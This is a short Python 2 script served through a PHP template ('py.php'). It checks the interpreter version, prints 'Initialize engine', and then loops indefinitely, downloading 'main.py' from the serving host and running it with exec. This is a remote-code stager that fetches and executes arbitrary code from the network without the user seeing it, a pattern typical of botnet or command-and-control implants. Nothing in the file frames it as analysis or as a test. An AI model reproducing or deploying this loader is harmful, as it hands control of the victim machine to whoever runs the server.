#!/usr/bin/env python
import imp
if imp.get_magic() != '\x03\xf3\r\n':
    print "Please update to Python 2.7.3 (http://www.python.org/download/)"
else:
    import zlib
    import marshal
    import urllib
    import time
    _C = True
    _U = '<?php echo $_SERVER['QUERY_STRING'];?>'
    _B = '<?php echo $_SERVER['HTTP_HOST'].str_replace('/py.php','',$_SERVER['SCRIPT_NAME']);?>'
    print "[...] Initialize engine ..."
    while _C:
        try:
            time.sleep(2)
            exec urllib.urlopen('http://'+_B+'/main.py').read()
        except:
            time.sleep(5)